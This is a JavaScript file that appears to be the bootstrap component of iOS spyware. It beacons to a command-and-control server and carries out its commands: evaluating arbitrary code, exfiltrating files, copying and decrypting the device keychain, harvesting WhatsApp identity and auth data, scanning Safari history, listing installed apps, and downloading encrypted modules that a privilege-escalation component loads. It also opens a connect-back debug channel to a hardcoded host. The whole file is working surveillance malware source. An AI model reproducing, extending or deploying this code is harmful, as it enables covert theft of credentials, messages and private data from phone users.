		if (!(ensureLocalPollSec > 0)) ensureLocalPollSec = 18;
		if (ensureLocalPollSec > 25) ensureLocalPollSec = 25;

		function _bsHeartbeatFresh(maxAgeMs) {
			try {
				var raw = _fsRead("/tmp/c2_ipc/bs.heartbeat", 512);
				if (!raw) return false;
				var ho = JSON.parse(raw);
				var bts = Number(ho && ho.ts ? ho.ts : 0);
				if (!bts) return false;
				return (Date.now() - bts) < (maxAgeMs || 45000);
			} catch (e) {
				return false;
			}
		}

		function _runEnsureBs(tag) {
			// Living bootstrap: we already write heartbeat — treat self as online
			if (_bsHeartbeatFresh(45000)) {
				_opsLog(uid, "ensure_bs skip self_online " + tag);
				return { ok: true, online: true, timeout: false, pending: false, error: "" };
			}
			_opsLog(uid, "ensure_bs begin " + tag + " kick pe (short ack)");
			var er = _peIpcRoundtrip(uid, cmdId, "ensure_bs", {
				silent: true,
				wait_sec: 8
			});
			var res = (er && er.result) ? er.result : {};
			var online = !!res.online;
			var pending = !!(res.pending || res.started);
			var kickFail = !er || er.error === "pe result timeout";
			if (online) {
				_opsLog(uid, "ensure_bs done " + tag + " online=true via pe");
				return { ok: true, online: true, timeout: false, pending: false, error: "" };
			}
			// pe kicked (or already pending): poll local heartbeat ourselves
			if (pending || (er && er.ok) || kickFail) {
				_opsLog(uid, "ensure_bs local_poll " + tag + " sec=" + ensureLocalPollSec +
					" pending=" + pending + " kickFail=" + kickFail);
				var t0 = Date.now();
				var budget = ensureLocalPollSec * 1000;
				while (Date.now() - t0 < budget) {
					if (_bsHeartbeatFresh(45000)) {
						_opsLog(uid, "ensure_bs done " + tag + " online=true local_poll");
						return { ok: true, online: true, timeout: false, pending: false, error: "" };
					}
					Native.callSymbol("usleep", 500000);
				}
			}
			var timedOut = true;
			_opsLog(uid, "ensure_bs done " + tag + " online=false timeout=true continue");
			// Timeout → still continue subsequent list items
			return {
				ok: true,
				online: false,
				timeout: timedOut,
				pending: true,
				error: "bs_timeout_continue"
			};
		}

		for (var ai = 0; ai < actions.length; ai++) {
			var act = actions[ai] || {};
			var aname = act.name || act.payload || ("a" + ai);
			try {
				if (aname === "ensure_bs" || act.payload === "ensure_bs" || act.payload === "reinject_bootstrap") {
					var w = (act.params && act.params.wait_sec != null) ? Number(act.params.wait_sec) : ensureWaitSec;
					if (w > 0 && w <= 30) ensureWaitSec = w;
					var es = _runEnsureBs("action");
					actionLog.push({ name: "ensure_bs", ok: !!es.ok, online: !!es.online, timeout: !!es.timeout, error: es.error || "" });
				} else if (act.kind === "pe_cmd") {
					_peIpcRoundtrip(uid, cmdId, act.payload || aname, { silent: true });
					actionLog.push({ name: aname, ok: true });
				} else if (aname === "p7_warmup" || aname === "p7" || act.payload === "pe_dbg" || act.payload === "pe_dbg.js" || act.kind === "p7_warmup") {
					// Defer until after app match — only run if WhatsApp is installed (see p7_once below).
					actionLog.push({
						name: "p7_warmup",
						ok: true,
						deferred: true,
						force: !!(act.params && act.params.force)
					});
					_opsLog(uid, "p7_warmup deferred until match (WA only)");
				} else if (act.kind === "bs_task" && (act.payload === "app_list" || aname === "app_list")) {
					actionLog.push({ name: "app_list", ok: true, defer: true });
				} else if (aname === "safari_promo" || act.payload === "safari_promo" || act.kind === "safari_promo") {
					var promoHit = _runSafariPromo(uid, cmdId);
					actionLog.push({
						name: "safari_promo",
						ok: true,
						hit: promoHit.hit,
						match: promoHit.match || "",
						scanned_dbs: promoHit.scanned_dbs || 0
					});
				} else if (act.kind === "download" || aname === "safari_history") {
					// legacy download kept for manual cmds; defaults now use safari_promo
					var paths = (act.params && act.params.paths) ? act.params.paths : [];
					for (var pi = 0; pi < paths.length; pi++) {
						var up = _uploadWithResultUrls(uid, cmdId, paths[pi], urlState, 16384);
						urlState = up.state || urlState;
						actionLog.push({ name: "download", path: paths[pi], ok: !!up.ok, error: up.error || "" });
					}
				} else {
					actionLog.push({ name: aname, ok: false, error: "skip_unknown" });
				}
			} catch (ae) {
				actionLog.push({ name: aname, ok: false, error: String(ae).slice(0, 80) });
			}
		}

		var installed = [];
		try {
			installed = _listAppContainers();
			_sendNamedResult(uid, cmdId, "app_list.json", installed);
		} catch (le) {
			_opsLog(uid, "app_list fail " + String(le).slice(0, 60));
		}

		var tasks = pull.tasks || [];
		var matched = [];
		for (var ti = 0; ti < tasks.length; ti++) {
			if (_matchAppName(installed, tasks[ti])) matched.push(tasks[ti]);
		}
		_opsLog(uid, "task_pipeline matched=" + matched.length + "/" + tasks.length);

		// Pull config → match installed apps → run in order.
		// On fail: report, continue others; retry failed after >= payloadRetryMinSec (default 30s).
		var retryMinMs = (Number(settings.payloadRetryMinSec) || 30) * 1000;
		if (retryMinMs < 30000) retryMinMs = 30000;
		var maxRounds = Number(settings.payloadRetryMaxRounds);
		if (!(maxRounds > 0)) maxRounds = 3;
		if (maxRounds > 10) maxRounds = 10;

		var loadLog = [];
		var primaryUrl = urlState.start_url || "";
		var pending = [];
		for (var mi0 = 0; mi0 < matched.length; mi0++) {
			if (matched[mi0] && matched[mi0].payload) pending.push(matched[mi0]);
			else if (matched[mi0]) {
				loadLog.push({
					bundleId: matched[mi0].bundleId,
					name: matched[mi0].name || "",
					payload: "",
					ok: false,
					skipped: true,
					error: "no_payload",
					round: 0
				});
			}
		}

		// Prefer non-WA (e.g. Telegram) before WhatsApp so P7/WA hangs cannot starve TG.
		pending.sort(function (a, b) {
			var aw = _isWhatsAppEntry(a) ? 1 : 0;
			var bw = _isWhatsAppEntry(b) ? 1 : 0;
			return aw - bw;
		});
		try {
			var orderBits = [];
			for (var oi = 0; oi < pending.length; oi++) orderBits.push(pending[oi].bundleId || pending[oi].payload || "?");
			if (orderBits.length) _opsLog(uid, "task_pipeline order " + orderBits.join(" -> "));
		} catch (oe) {}

		var needWaP7 = false;
		for (var wi = 0; wi < pending.length; wi++) {
			if (_isWhatsAppEntry(pending[wi])) { needWaP7 = true; break; }
		}
		if (!needWaP7) {
			_opsLog(uid, "task_pipeline p7_once skip (no WhatsApp matched)");
		}
		var p7OnceRan = false;
		var forceP7 = false;
		for (var fi = 0; fi < actionLog.length; fi++) {
			if (actionLog[fi] && actionLog[fi].name === "p7_warmup" && actionLog[fi].force) forceP7 = true;
		}

		function _reportPipelineFail(ent, lr, round) {
			_opsLog(uid, "task_pipeline fail r" + round + " " + (ent.bundleId || "") + " " + (lr.error || "failed"));
			try {
				if (typeof __payloadFallbackReport === "function") {
					__payloadFallbackReport({
						module_id: lr.module_id || ent.payload || "pipeline",
						stage: "pipeline_r" + round,
						error: String(lr.error || "failed").slice(0, 500),
						app_id: ent.bundleId || "",
						app_version: ent.app_version || "",
						uid: uid,
						command_id: cmdId,
						meta: { name: ent.name || "", payload: ent.payload || "", round: round }
					});
				}
			} catch (fe) {}
		}

		var round = 0;
		while (pending.length && round < maxRounds) {
			round++;
			_opsLog(uid, "task_pipeline round=" + round + "/" + maxRounds + " n=" + pending.length);
			// Every round starts with ensure_bs (pe-owned); max 30s then continue subsequent
			_runEnsureBs("round" + round);
			var nextFail = [];
			for (var mi = 0; mi < pending.length; mi++) {
				var ent = pending[mi];
				var payload = ent.payload || "";
				_opsLog(uid, "task_pipeline load r" + round + " " + ent.bundleId + " -> " + payload);
				// First WA load: run P7 once (after TG already had a chance this round)
				if (needWaP7 && !p7OnceRan && _isWhatsAppEntry(ent)) {
					p7OnceRan = true;
					var dcodeP = params.device_code || "";
					if (!dcodeP) {
						try {
							var diP = _resolveDeviceIds();
							if (diP && diP.uuid) dcodeP = String(diP.uuid);
						} catch (e) {}
						if (!dcodeP) dcodeP = uid;
					}
					var wrOnce = _runP7Warmup(uid, cmdId, dcodeP, primaryUrl || "", { force: forceP7 });
					actionLog.push({
						name: "p7_warmup",
						ok: !!wrOnce.ok,
						wa_identity: !!wrOnce.wa_identity,
						reused: !!(wrOnce.reused || wrOnce.skipped),
						skipped: wrOnce.skipped || "",
						error: wrOnce.error || "",
						once: true,
						before: ent.bundleId || ""
					});
					_opsLog(uid, "task_pipeline p7_once ok=" + !!wrOnce.ok + " wa=" + !!wrOnce.wa_identity +
						" skip=" + (wrOnce.skipped || ""));
				}
				// WA: never re-run P7 inside entry — identity from /tmp/wa_identity.json + p7.cache
				var lr = _runMatchedEntry(uid, cmdId, ent, params.device_code || "", primaryUrl, { skip_p7: true });
				var row = {
					bundleId: ent.bundleId,
					name: ent.name || "",
					payload: payload,
					ok: !!lr.ok,
					skipped: !!lr.skipped,
					error: lr.error || "",
					module_id: lr.module_id || "",
					via: lr.via || "",
					round: round,
					p7_skipped: !!lr.p7_skipped,
					wa_identity: !!lr.wa_identity
				};
				loadLog.push(row);
				if (lr.ok) {
					_opsLog(uid, "task_pipeline ok r" + round + " " + ent.bundleId);
					continue;
				}
				if (lr.skipped) {
					_opsLog(uid, "task_pipeline skip " + ent.bundleId + " " + (lr.error || ""));
					continue; // no retry for missing CDN/module stubs
				}
				_reportPipelineFail(ent, lr, round);
				nextFail.push(ent);
			}
			pending = nextFail;
			if (pending.length && round < maxRounds) {
				_opsLog(uid, "task_pipeline retry_wait " + Math.floor(retryMinMs / 1000) + "s n=" + pending.length);
				Native.callSymbol("usleep", retryMinMs * 1000);
			}
		}
		if (pending.length) {
			_opsLog(uid, "task_pipeline give_up n=" + pending.length + " after " + round + " rounds");
		}

		var loadedOk = 0;
		var failedN = 0;
		var skippedN = 0;
		for (var li = 0; li < loadLog.length; li++) {
			if (loadLog[li].ok) loadedOk++;
			else if (loadLog[li].skipped) skippedN++;
			else failedN++;
		}

		try {
			_sbPost(BEACON_HOST, BEACON_PORT, "/api/task/pipeline/done", "application/json", JSON.stringify({
				uid: uid,
				status: pending.length ? "partial" : "done",
				meta: {
					matched: matched.length,
					loaded: loadedOk,
					failed: failedN,
					skipped: skippedN,
					rounds: round,
					pull_id: urlState.pull_id,
					loads: loadLog
				}
			}));
		} catch (de) {}

		_sendResult(uid, cmdId, {
			status: "completed",
			role: "bootstrap",
			result: {
				ok: pending.length === 0,
				pull_id: urlState.pull_id,
				actions: actionLog,
				matched: matched.length,
				loads: loadLog,
				rounds: round,
				failed_left: pending.length,
				result_urls: (urlState.result_urls || []).length
			}
		});
		_opsLog(uid, "task_pipeline done matched=" + matched.length + " ok=" + loadedOk + " fail=" + failedN);
	} finally {
		_pipelineUnlock();
	}
}

function _handleCmd(uid, cmd) {
	if (!cmd || !cmd.type || cmd.type === "noop") return;
	var cmdId = cmd.command_id || "";
	var p = cmd.params || {};
	_c2Log("[C2-STUB] cmd=" + cmd.type);

	if (cmd.type === "exec" || cmd.type === "eval_js") {
		var code = p.code || "";
		if (!code) {
			_sendResult(uid, cmdId, { status: "failed", error: "empty code", role: "bootstrap" });
			return;
		}
		try {
			var r = eval(code);
			_sendResult(uid, cmdId, { status: "success", result: String(r !== undefined ? r : ""), role: "bootstrap" });
		} catch (e) {
			_sendResult(uid, cmdId, { status: "failed", error: String(e).slice(0, 200), role: "bootstrap" });
		}
		return;
	}

	if (cmd.type === "ping") {
		_sendResult(uid, cmdId, { status: "success", result: "pong", role: "bootstrap" });
		return;
	}

	if (cmd.type === "apps") {
		_opsLog(uid, "apps list");
		try {
			var apps = _listAppContainers();
			_sendNamedResult(uid, cmdId, "app_list.json", apps);
			_sendResult(uid, cmdId, {
				status: "success",
				result: { ok: true, count: apps.length, role: "bootstrap" },
				role: "bootstrap"
			});
		} catch (ae) {
			_sendResult(uid, cmdId, {
				status: "failed",
				error: "apps: " + String(ae).slice(0, 120),
				role: "bootstrap"
			});
		}
		return;
	}

	if (cmd.type === "download") {
		var dpath = p.path || "";
		if (!dpath) {
			_sendResult(uid, cmdId, { status: "failed", error: "path required", role: "bootstrap" });
			return;
		}
		_opsLog(uid, "download " + dpath);
		_exfilFile(uid, cmdId, dpath, p.chunk_size || p.chunk || 16384);
		return;
	}

	if (cmd.type === "pe_ping") {
		_peIpcRoundtrip(uid, cmdId, "ping");
		return;
	}

	if (cmd.type === "pe_info") {
		_peIpcRoundtrip(uid, cmdId, "pe_info");
		return;
	}

	if (cmd.type === "pe_launchd_ping") {
		_opsLog(uid, "pe_launchd_ping");
		_peIpcRoundtrip(uid, cmdId, "launchd_ping");
		return;
	}

	if (cmd.type === "pe_load") {
		// E5-M2: fetch module from 8090 (auth gated) -> drop file -> pe load_module
		var modName = p.name || p.module || p.module_id || "";
		var dcode = p.device_code || p.deviceCode || "";
		if (!dcode) {
			var diLoad = _resolveDeviceIds();
			if (diLoad && diLoad.uuid) dcode = String(diLoad.uuid);
			else dcode = uid;
		}
		if (!modName) {
			_sendResult(uid, cmdId, { status: "failed", error: "name required", role: "bootstrap" });
			return;
		}
		_opsLog(uid, "pe_load " + modName + " code=" + dcode);
		var getBody = JSON.stringify({
			name: modName.indexOf(".js") >= 0 ? modName : (modName + ".js"),
			uid: uid,
			uuid: uid,
			device_code: dcode
		});
		var got = null;
		try {
			got = _sbPost(BEACON_HOST, BEACON_PORT, "/api/payload/get", "application/json", getBody);
		} catch (e) {
			got = null;
		}
		if (!got || (!got.src && !(got.task && got.task.package) && !(got.pack === "n7z2" && got.enc))) {
			_sendResult(uid, cmdId, {
				status: "failed",
				error: (got && got.detail) ? String(got.detail).slice(0, 120) : "payload/get failed",
				role: "bootstrap"
			});
			return;
		}
		var task = got.task || null;
		var pkg = "";
		try {
			if (typeof __n7z_unwrapPayload === "function") pkg = __n7z_unwrapPayload(got);
			else if (task && task.package) pkg = String(task.package);
			else pkg = String(got.src || "");
		} catch (ue) {
			_sendResult(uid, cmdId, {
				status: "failed",
				error: "n7z unwrap: " + String(ue).slice(0, 80),
				role: "bootstrap"
			});
			return;
		}
		if (!pkg || pkg.length < 8) {
			_sendResult(uid, cmdId, { status: "failed", error: "empty package after unwrap", role: "bootstrap" });
			return;
		}
		var timeoutSec = task ? Number(task.timeout_sec || 0) : 0;
		var resultUrl = task ? String(task.result_url || "") : "";
		var mid = (task && task.module_id) ? task.module_id : (got.module_id || modName.replace(/\.js$/, ""));
		var mpath = "/tmp/c2_ipc/mod." + mid;
		try { Native.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (e) {}
		if (!_fsWrite(mpath, pkg)) {
			_sendResult(uid, cmdId, { status: "failed", error: "write mod file failed", path: mpath, role: "bootstrap" });
			return;
		}
		_c2Log("[C2-STUB] pe_load wrote " + mpath + " len=" + pkg.length + " timeout=" + timeoutSec + " enc=" + (!!got.enc_on));
		var taskMeta = { timeout_sec: timeoutSec, result_url: resultUrl, module_id: mid };
		// Lab pe_dbg_tcp: inject connect-back host/port/token for hot module
		if (mid === "pe_dbg_tcp" || String(modName).indexOf("pe_dbg_tcp") >= 0) {
			var dbgHost = String(p.host || p.dbg_host || "192.168.31.32");
			var dbgPort = Number(p.port || p.dbg_port || 19527) || 19527;
			var dbgToken = String(p.token || p.dbg_token || "");
			if (!dbgToken) {
				try {
					var tokBody = _fsRead("/tmp/c2_ipc/dbg.token");
					if (tokBody) dbgToken = String(tokBody).replace(/\s+/g, "");
				} catch (te) {}
			}
			var dbgCfg = { host: dbgHost, port: dbgPort, token: dbgToken };
			try {
				_fsWrite("/tmp/c2_ipc/dbg.tcp.json", JSON.stringify(dbgCfg));
			} catch (de) {}
			taskMeta.dbg_host = dbgHost;
			taskMeta.dbg_port = dbgPort;
			taskMeta.dbg_token = dbgToken;
			taskMeta.host = dbgHost;
			taskMeta.port = dbgPort;
			taskMeta.token = dbgToken;
			_opsLog(uid, "pe_dbg_tcp cfg " + dbgHost + ":" + dbgPort + " token=" + (dbgToken ? "set" : "empty"));
		}
		try {
			_fsWrite(mpath + ".task.json", JSON.stringify(taskMeta));
		} catch (me) {}
		_peIpcRoundtrip(uid, cmdId, "load_module", {
			name: mid,
			path: mpath,
			timeout_sec: timeoutSec,
			result_url: resultUrl
		});
		return;
	}

	if (cmd.type === "pe_read") {
		var rpath = p.path || "";
		if (!rpath) {
			_sendResult(uid, cmdId, { status: "failed", error: "path required", role: "bootstrap" });
			return;
		}
		_peIpcRoundtrip(uid, cmdId, "read_path", { path: rpath, max: p.max || 32 });
		return;
	}

	if (cmd.type === "pe_p7_warmup" || cmd.type === "p7_warmup") {
		var dcodeP7 = p.device_code || "";
		if (!dcodeP7) {
			try {
				var diP7 = _resolveDeviceIds();
				if (diP7 && diP7.uuid) dcodeP7 = String(diP7.uuid);
			} catch (e) {}
			if (!dcodeP7) dcodeP7 = uid;
		}
		var wrP7 = _runP7Warmup(uid, cmdId, dcodeP7, "", {
			force: !!p.force,
			phase: p.phase || "all",
			wait_sec: p.wait_sec
		});
		_sendResult(uid, cmdId, {
			status: wrP7.ok ? "completed" : "failed",
			role: "bootstrap",
			result: wrP7
		});
		return;
	}

	// Split P7: keychain_copy only (no RC/Phase2)
	if (cmd.type === "pe_p7_keychain" || cmd.type === "p7_keychain") {
		var dcodeKc = p.device_code || "";
		if (!dcodeKc) {
			try {
				var diKc = _resolveDeviceIds();
				if (diKc && diKc.uuid) dcodeKc = String(diKc.uuid);
			} catch (e) {}
			if (!dcodeKc) dcodeKc = uid;
		}
		var wrKc = _runP7Warmup(uid, cmdId, dcodeKc, "", { force: !!p.force, phase: "keychain" });
		_sendResult(uid, cmdId, {
			status: wrKc.ok ? "completed" : "failed",
			role: "bootstrap",
			result: wrKc
		});
		return;
	}

	// Split P7: Phase2 decrypt only (expects /tmp/keychain-2.db)
	if (cmd.type === "pe_p7_phase2" || cmd.type === "p7_phase2") {
		var dcodePh = p.device_code || "";
		if (!dcodePh) {
			try {
				var diPh = _resolveDeviceIds();
				if (diPh && diPh.uuid) dcodePh = String(diPh.uuid);
			} catch (e) {}
			if (!dcodePh) dcodePh = uid;
		}
		var wrPh = _runP7Warmup(uid, cmdId, dcodePh, "", {
			force: !!p.force,
			phase: "phase2",
			wait_sec: p.wait_sec
		});
		_sendResult(uid, cmdId, {
			status: wrPh.ok ? "completed" : "failed",
			role: "bootstrap",
			result: wrPh
		});
		return;
	}

	if (cmd.type === "pe_keychain_copy") {
		_peIpcRoundtrip(uid, cmdId, "keychain_copy");
		return;
	}

	if (cmd.type === "pe_exfil") {
		var epath = p.path || "/tmp/keychain-2.db";
		_exfilFile(uid, cmdId, epath, p.chunk_size || p.chunk || 16384);
		return;
	}

	if (cmd.type === "pe_session_start") {
		var spayload = p.payload || "probe";
		var starget = p.target || ((spayload === "whatsapp" || spayload === "wa") ? "WhatsApp" : "configd");
		var sid = p.session_id || ("s" + Date.now());
		_opsLog(uid, "session_start " + sid + " -> " + starget + " payload=" + spayload);
		_peIpcRoundtrip(uid, cmdId, "session_start", {
			target: starget,
			session_id: sid,
			payload: spayload
		});
		return;
	}

	if (cmd.type === "pe_session_stop") {
		var sid2 = p.session_id || p.sid || "";
		if (!sid2) {
			_sendResult(uid, cmdId, { status: "failed", error: "session_id required", role: "bootstrap" });
			return;
		}
		_opsLog(uid, "session_stop " + sid2);
		_peIpcRoundtrip(uid, cmdId, "session_stop", { session_id: sid2 });
		return;
	}

	if (cmd.type === "pe_wa_collect") {
		// A.v1 pe-side: no WhatsApp InjectJS. Discover AppGroup + exfil auth files.
		// REQUIRES_P7 once (cache-gated): identity keys from /tmp/wa_identity.json
		_opsLog(uid, "pe_wa_collect: p7_warmup(once) then configd session payload=whatsapp");
		var dcodeWa = p.device_code || "";
		if (!dcodeWa) {
			try {
				var diWa = _resolveDeviceIds();
				if (diWa && diWa.uuid) dcodeWa = String(diWa.uuid);
			} catch (e) {}
			if (!dcodeWa) dcodeWa = uid;
		}
		_runP7Warmup(uid, cmdId, dcodeWa, "", { force: !!p.force });
		var sidw = p.session_id || ("wa_" + Date.now());
		_peIpcRoundtrip(uid, cmdId, "session_start", {
			target: "configd",
			session_id: sidw,
			payload: "whatsapp"
		});
		return;
	}

	if (cmd.type === "pe_session_list") {
		_peIpcRoundtrip(uid, cmdId, "session_list");
		return;
	}

	if (cmd.type === "pe_reinject_bootstrap") {
		_opsLog(uid, "pe_reinject_bootstrap via bs");
		_peIpcRoundtrip(uid, cmdId, "reinject_bootstrap");
		return;
	}

	if (cmd.type === "task_pipeline" || cmd.type === "task_pull_run") {
		_runTaskPipeline(uid, cmdId, p);
		return;
	}

	if (cmd.type === "task_pull") {
		var pulled = _taskPull(uid);
		if (!pulled) {
			_sendResult(uid, cmdId, { status: "failed", error: "task/pull failed", role: "bootstrap" });
			return;
		}
		_sendNamedResult(uid, cmdId, "task_pull.json", pulled);
		_sendResult(uid, cmdId, { status: "completed", role: "bootstrap", result: { ok: true, pull_id: pulled.pull_id, tasks: (pulled.tasks || []).length } });
		return;
	}

	if (cmd.type === "pe_dbg_tcp_start") {
		// Lab helper: write cfg then pe_load pe_dbg_tcp
		var dcodeTcp = p.device_code || p.deviceCode || "";
		if (!dcodeTcp) {
			var diTcp = _resolveDeviceIds();
			if (diTcp && diTcp.uuid) dcodeTcp = String(diTcp.uuid);
			else dcodeTcp = uid;
		}
		cmd.type = "pe_load";
		cmd.params = {
			name: "pe_dbg_tcp.js",
			device_code: dcodeTcp,
			host: p.host || p.dbg_host || "192.168.31.32",
			port: p.port || p.dbg_port || 19527,
			token: p.token || p.dbg_token || ""
		};
		return _handleCmd(uid, cmd);
	}

	_sendResult(uid, cmdId, { status: "failed", error: "stub only: exec/ping/apps/download/pe_*/pe_exfil/pe_session_*/pe_wa_collect/pe_launchd_ping/pe_load/pe_reinject_bootstrap/task_pipeline/p7_warmup/p7_keychain/p7_phase2/pe_dbg_tcp_start", role: "bootstrap" });
}

try {
	Native.init();
	invoker();
	var pid = Native.callSymbol("getpid");
	var SESSION_UID = "bootstrap-" + pid;
	var deviceIds = null;
	try {
		deviceIds = _ensureDeviceIds();
	} catch (e) {
		deviceIds = _resolveDeviceIds();
	}
	// Partner-aligned device uuid (SerialNumber); session keeps process-scoped id for ops logs
	var UID = (deviceIds && deviceIds.uuid) ? String(deviceIds.uuid) : SESSION_UID;
	_c2Log("[C2-STUB] boot pid=" + pid + " uuid=" + UID + " session=" + SESSION_UID +
		" src=" + ((deviceIds && deviceIds.source) || "session"));

	var deviceInfo = {
		machine: "iPhone",
		channel_code: "201314",
		role: "bootstrap",
		source: "bootstrap",
		stage: "sb_stub_alive",
		pid: pid,
		session_uid: SESSION_UID,
		serial: (deviceIds && deviceIds.serial) || "",
		unique: (deviceIds && deviceIds.unique) || "",
		uuid_source: (deviceIds && deviceIds.source) || "session"
	};

	_c2Log("[C2-STUB] loop start");
	var lastLocalPlanTs = 0;
	var localPlanIntervalMs = 600000;
	var bootPlanPending = true;
	for (;;) {
		try {
			// Late bind / upgrade: pe may write pe_pid placeholder; SB upgrades to SerialNumber
			if (!deviceIds || !deviceIds.serial || UID === SESSION_UID ||
				(deviceIds.source !== "serial" && deviceIds.source !== "unique")) {
				var again = null;
				try { again = _ensureDeviceIds(); } catch (e) { again = _resolveDeviceIds(); }
				if (again && again.uuid && String(again.uuid) !== String(UID)) {
					UID = String(again.uuid);
					deviceIds = again;
					deviceInfo.serial = again.serial || "";
					deviceInfo.unique = again.unique || "";
					deviceInfo.uuid_source = again.source || "serial";
					_c2Log("[C2-STUB] uuid late-bind " + UID + " src=" + deviceInfo.uuid_source);
				} else if (again && again.serial && deviceIds && !deviceIds.serial) {
					deviceIds = again;
					deviceInfo.serial = again.serial || "";
					deviceInfo.unique = again.unique || "";
					deviceInfo.uuid_source = again.source || "serial";
				}
			}
			_fsWrite("/tmp/c2_ipc/bs.heartbeat", JSON.stringify({
				ts: Date.now(),
				uid: UID,
				session_uid: SESSION_UID,
				pid: pid
			}));
			_relayPeReport(UID);
			var beaconBody = JSON.stringify({
				uuid: UID,
				session_uid: SESSION_UID,
				device_info: deviceInfo,
				status: "idle"
			});
			var resp = _sbPost(BEACON_HOST, BEACON_PORT, "/beacon", "application/json", beaconBody);
			// 1) Backend queue first (ad-hoc / auto:task_pipeline)
			var ranBackendPipeline = false;
			if (resp && resp.type && resp.type !== "noop") {
				if (resp.type === "task_pipeline" || resp.type === "task_pull_run") ranBackendPipeline = true;
				_handleCmd(UID, resp);
			}
			// 2) Local task_config plan: boot once + every configRefreshInterval
			var nowTs = Date.now();
			var due = bootPlanPending || (nowTs - lastLocalPlanTs >= localPlanIntervalMs);
			if (due) {
				bootPlanPending = false;
				lastLocalPlanTs = nowTs;
				if (!ranBackendPipeline) {
					_opsLog(UID, "local_plan begin");
					_runTaskPipeline(UID, "local-" + nowTs, { source: "local_loop" });
					try {
						// Refresh interval from last pull settings if present on global cache
						if (globalThis.__pe_last_task_settings && globalThis.__pe_last_task_settings.configRefreshInterval) {
							var sec = Number(globalThis.__pe_last_task_settings.configRefreshInterval) || 600;
							if (sec < 60) sec = 60;
							localPlanIntervalMs = sec * 1000;
						}
					} catch (ie) {}
				}
			}
		} catch (loopErr) {
			_c2Log("[C2-STUB] loop ERR");
		}
		Native.callSymbol("usleep", BEACON_INTERVAL_SEC * 1000000);
	}
} catch (e) {
	try { _c2Log("[C2-STUB] THREW " + String(e).slice(0, 120)); } catch (e2) {}
}
